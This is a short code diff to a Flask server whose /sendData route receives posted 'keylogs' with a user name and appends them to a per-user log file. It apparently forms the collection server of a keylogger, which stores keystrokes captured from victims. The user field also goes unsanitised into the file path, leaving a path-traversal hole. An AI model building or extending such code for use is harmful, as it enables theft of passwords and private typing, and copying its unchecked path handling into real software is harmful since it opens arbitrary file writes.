@@ -11,13 +11,15 @@ def index():
 
 @app.route('/sendData', methods=['POST'])
 def getData():
-  newData = request.json['keylogs']
-  print("Received data:", newData)
-  user = request.json['user']
+  user, newData = request.form['user'], request.form['keylogs']
+  # user = request.form['user']
+
   logFilePath = './logs/'+user+'_log.out'
   logFile = open(logFilePath, 'a')
   logFile.write(newData)
   logFile.close()
+
+  return 'Received your request for '+user
 
 if __name__ == "__main__":
   print(f"Log Server is listening on port {port}")
